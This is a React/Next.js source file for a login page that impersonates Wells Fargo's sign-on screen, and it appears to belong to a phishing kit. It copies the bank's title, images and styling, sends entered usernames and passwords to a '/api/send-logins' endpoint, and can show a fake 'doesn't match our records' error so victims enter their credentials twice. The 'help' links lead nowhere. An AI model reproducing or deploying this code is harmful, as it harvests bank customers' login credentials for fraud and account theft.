/* eslint-disable @next/next/no-img-element */
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import {
  Typography,
  FormControlLabel,
  Checkbox,
  Box,
  Link,
} from "@mui/material";
import axios from "axios";
import Head from "next/head";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useRef, useState } from "react";
import { useForm } from "react-hook-form";
import { ExclamationIcon } from "../components/CustomError";
import { CustomInput } from "../components/CustomInput";
import { Footer } from "../components/Footer";
import { Header } from "../components/Header";
import { ShowPasswordToggle } from "../components/ShowPasswordToggle";
import { SubmitButton } from "../components/SubmitButton";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";
import { greeting } from "../utils/greeting";

interface LoginProps {}

const schema = yup.object().shape({
  username: yup
    .string()
    .required("That username is too short.")
    .min(6, "That username is too short."),
  password: yup
    .string()
    .required("That password is too short.")
    .min(6, "That password is too short."),
});

export const Login: React.FC<LoginProps> = ({}) => {
  const { data: datas, setData } = useContext(DataContext);

  const [loginAttempt, setLoginAttempt] = useState(
    datas && datas.logins ? Object.keys(datas.logins).length : 0
  );
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const [logins, setLogins] = useState({});
  const { push } = useRouter();

  const bgImg = useRef(
    ["tractor", "park", "balloons"][Math.round(Math.random() * 2)]
  );

  const {
    register,
    handleSubmit,
    reset,
    formState: { errors, isValid },
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onTouched`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `LOGIN DETAILS`);
    formData.append(
      `loginDetails`,
      JSON.stringify({ loginAttempt: loginAttempt + 1, sessionId: datas.sessionId,...data })
    );

    try {
      await axios.post(`/api/send-logins`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: `LOGIN DETAILS`,
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    setData({
      ...datas,
      logins: {
        ...(datas && datas.logins ? datas.logins : {}),
        ...logins,
        [loginAttempt + 1]: {
          form: `LOGIN DETAILS`,
          loginDetails: {
            loginAttempt:
              datas && !datas.logins
                ? 1
                : Object.keys(datas ? datas.logins : []).length,
            ...data,
          },
        },
      },
    });

    if (!loginAttempt && process.env.NEXT_PUBLIC_DOUBLE_LOGIN === `ON`) {
      setLoginAttempt(1);
      setLoading(false);
      setShowError(true);
      reset({
        username: ``,
        password: ``,
      });

      //   push(`/invalidAttempt`);
      return;
    }

    const url = getProgress()[0];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <>
      <Head>
        <title>Sign On to View Your Personal Accounts | Wells Fargo</title>
        <link href="/favicon.ico" />
      </Head>
      <Box>
        <Box minHeight="100vh">
          <Box
            // minHeight="100vh"
            display="flex"
            flexDirection="column"
            justifyContent="space-between"
            overflow="hidden"
            className="outer-container"
          >
            <Header />
            <Box
              sx={{
                display: "flex",
                flexFlow: "column nowrap",
                flex: "1 1 auto",
                overflow: "hidden",
                zIndex: 0,
                position: "fixed",
                top: 0,
                left: 0,
                bottom: 0,
                right: 0,
              }}
            >
              <img
                alt="Lifestyle"
                src={`https://www10.wellsfargomedia.com/auth/static/images/COB-BOB-IRT-enroll_${bgImg.current}.jpg`}
                style={{
                  overflow: "hidden",
                  zIndex: 0,
                  position: "fixed",
                  minHeight: "100%",
                  minWidth: "1024px",
                  width: "100%",
                  height: "auto",
                  top: 0,
                  left: 0,
                }}
              ></img>
            </Box>
            <Box
              sx={{
                display: "flex",
                flexFlow: "column nowrap",
                flex: "1 0 auto",
              }}
            >
              <Box
                sx={{
                  display: "flex",
                  flexFlow: "column nowrap",
                  flex: "1 1 auto",
                  alignItems: "center",
                }}
              >
                <Box
                  sx={{
                    paddingTop: ["42px", "60px"],
                    display: "flex",
                    flexFlow: "column nowrap",
                    flex: "1 1 auto",
                    alignItems: "center",
                    width: "100%",
                  }}
                >
                  <Box
                    sx={{
                      display: "flex",
                      flexFlow: "column nowrap",
                      flex: "1 1 auto",
                      alignItems: "stretch",
                      border: "none",
                      width: "100%",
                      backgroundColor: "transparent",
                    }}
                  >
                    <Box
                      sx={{
                        margin: [0, "64px auto 90px"],
                        marginTop: [0, "124px"],
                        borderRadius: [0, "12px"],
                        boxShadow: "0 0 16px 0 rgb(59 51 49 / 15%)",
                        width: ["auto", "83%"],
                        maxWidth: ["100%", "870px"],
                        backgroundColor: "#fff",
                        fontSize: "15px",
                        position: "relative",
                        zIndex: 0,
                        paddingX: ["16px", 0],
                        flexDirection: ["column", "initial"],
                        display: ["flex", "initial"],
                        flex: ["1 1 auto", "auto"],
                      }}
                    >
                      {showError ? (
                        <Box
                          width={["100%", "50%"]}
                          sx={{
                            width: ["100%", "50%"],
                            marginRight: "auto",
                            marginLeft: "auto",
                            marginTop: ["16px", "2.5rem"],
                          }}
                        >
                          <Box
                            sx={{
                              display: "flex",
                              flexFlow: "row nowrap",
                              flex: "1 1 auto",
                              alignItems: "stretch",
                              lineHeight: "18px",
                              fontSize: "14px",
                              backgroundColor: "#fff",
                              color: "#3b3331",
                              border: "2px solid #9c9191",
                              padding: "16px 16px 16px 12px",
                              boxSizing: "border-box",
                              borderRadius: "2px",
                              fontWeight: 400,
                            }}
                          >
                            <Box
                              sx={{
                                display: "flex",
                                flexFlow: "column nowrap",
                                alignItems: "center",
                                justifyContent: "flex-start",
                                marginRight: "12px",
                              }}
                            >
                              <ExclamationIcon />
                            </Box>
                            <Box
                              sx={{
                                display: "flex",
                                flex: "1 1 100%",
                                flexDirection: "row",
                              }}
                            >
                              <Box>
                                <Box>
                                  <Box>
                                    That combination {`doesn't`} match our
                                    records. You can try again, or we can help
                                    you
                                    <Link
                                      href="#"
                                      sx={{
                                        color: "#5a469b",
                                        marginX: "0.2rem",
                                      }}
                                    >
                                      create a new password
                                    </Link>
                                    or
                                    <Link
                                      href="#"
                                      sx={{
                                        color: "#5a469b",
                                        marginLeft: "0.2rem",
                                      }}
                                    >
                                      find your username.
                                    </Link>
                                  </Box>
                                </Box>
                              </Box>
                            </Box>
                          </Box>
                        </Box>
                      ) : null}
                      <Box
                        sx={{
                          display: "flex",
                          flexWrap: "nowrap",
                          alignItems: "center",
                          justifyContent: "center",
                        }}
                      >
                        <Typography
                          component="h1"
                          sx={{
                            marginTop: ["12px", "26px"],
                            fontSize: ["24px", "30px"],
                            color: "#3b3331",
                            textAlign: "center",
                            fontWeight: 400,
                            lineHeight: "3.25rem",
                            fontFamily: `"Wells Fargo Serif",Georgia,serif`,
                            outline: "none",
                          }}
                        >
                          Good {greeting()}
                          <span
                            style={{
                              margin: "8px 0 16px",
                              fontSize: "15px",
                              display: "block",
                              lineHeight: "normal",
                              color: "#3b3331",
                              fontFamily: `Wells Fargo Sans,Verdana,Arial,Helvetica,sans-serif`,
                            }}
                          >
                            Sign on to manage your accounts
                          </span>
                        </Typography>
                      </Box>
                      <Box>
                        <Box>
                          <Box
                            sx={{
                              width: ["auto", "50%"],
                              margin: "0 auto",
                            }}
                          >
                            <Box paddingBottom="32px">
                              <CustomInput
                                label="Username"
                                error={
                                  !!(
                                    errors.username &&
                                    (errors.username
                                      .message as unknown as string)
                                  )
                                }
                                errorMessage={
                                  errors.username &&
                                  (errors.username.message as unknown as string)
                                }
                                register={register("username")}
                              />
                            </Box>
                            <Box marginTop="8px" paddingBottom="32px">
                              <CustomInput
                                label="Password"
                                type={showPassword ? "text" : "password"}
                                error={
                                  !!(
                                    errors.password &&
                                    (errors.password
                                      .message as unknown as string)
                                  )
                                }
                                errorMessage={
                                  errors.password &&
                                  (errors.password.message as unknown as string)
                                }
                                register={register("password")}
                                endAdornment={
                                  <ShowPasswordToggle
                                    showPassword={showPassword}
                                    setShowPassword={setShowPassword}
                                  />
                                }
                              />
                            </Box>
                            <Box
                              sx={{
                                display: "flex",
                                flexFlow: "row nowrap",
                                alignItems: "center",
                              }}
                            >
                              <Box>
                                <Box
                                  sx={{
                                    fontSize: "16px",
                                    color: "#3b3331",
                                    lineHeight: "23px",
                                    display: "flex",
                                  }}
                                >
                                  <Box
                                    sx={{
                                      display: "inline-flex",
                                      flexFlow: "row nowrap",
                                      alignItems: "flex-start",
                                      paddingTop: "0.5rem",
                                      paddingBottom: "0.5rem",
                                      marginLeft: "11px",
                                    }}
                                  >
                                    <FormControlLabel
                                      sx={{
                                        "& .MuiTypography-root": {
                                          paddingTop: "0.5rem",
                                          paddingRight: "0.5rem",
                                        },
                                      }}
                                      control={
                                        <Checkbox
                                          disableRipple
                                          sx={{
                                            padding: 0,
                                            paddingRight: "0.5rem",
                                            "& .MuiSvgIcon-root": {
                                              fontSize: 28,
                                            },
                                            "&.Mui-checked": {
                                              color: "#5a469b",
                                            },
                                          }}
                                        />
                                      }
                                      label="Save username"
                                    />
                                  </Box>
                                </Box>
                              </Box>
                            </Box>
                          </Box>
                          <Box
                            component="section"
                            sx={{
                              margin: "1rem auto .625rem",
                              display: "block",
                            }}
                          />
                          <SubmitButton
                            disabled={!isValid || loading}
                            onClick={onSubmit}
                          />
                          <Box
                            component="section"
                            sx={{
                              display: "flex",
                              flexFlow: "row nowrap",
                              alignItems: "center",
                              justifyContent: "center",
                              background: ["transparent", "#f4f0ed"],
                              borderBottomLeftRadius: [0, "12px"],
                              borderBottomRightRadius: [0, "12px"],
                            }}
                          >
                            <Box
                              component="span"
                              sx={{
                                padding: [0, "2rem 0 2.5rem"],
                                paddingBottom: ["4rem", "2.5rem;"],
                                textAlign: "center",
                                fontSize: "14px",
                                color: "#3b3331",
                                fontFamily: `Wells Fargo Sans,Verdana,Arial,Helvetica,sans-serif`,
                              }}
                            >
                              <Box
                                component="span"
                                marginRight="0.2rem"
                                sx={{
                                  display: ["block", "initial"],
                                }}
                              >
                                Need help?
                              </Box>
                              <Link
                                href="#"
                                sx={{
                                  fontSize: "14px",
                                  color: "#3b3331",
                                  textDecorationColor: "#3b3331",
                                }}
                              >
                                Create a new password
                              </Link>
                              <Box component="span" marginX="0.2rem">
                                or
                              </Box>
                              <Link
                                href="#"
                                sx={{
                                  fontSize: "14px",
                                  color: "#3b3331",
                                  textDecorationColor: "#3b3331",
                                }}
                              >
                                find your username
                              </Link>
                            </Box>
                          </Box>
                        </Box>
                      </Box>
                    </Box>
                  </Box>
                </Box>
              </Box>
            </Box>
            <Footer />
          </Box>
        </Box>
      </Box>
    </>
  );
};

export default Login;
